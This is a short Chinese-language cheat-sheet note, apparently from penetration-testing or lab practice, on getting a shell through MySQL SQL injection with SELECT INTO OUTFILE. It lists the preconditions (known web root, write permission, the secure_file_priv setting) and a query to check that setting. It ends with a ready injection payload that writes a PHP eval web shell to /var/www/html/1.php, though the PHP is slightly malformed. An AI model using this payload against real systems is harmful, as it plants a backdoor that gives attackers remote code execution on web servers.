select 1,2 into outfile "path"

条件
1. 需要知道远程目录
2. 远程目录有写权限
3. 数据库开启secure_file_priv

show global variables like '%secure%';


kobe' union select "<?php @eval($_GET(['test']))?>", 2 into outfile "/var/www/html/1.php" #
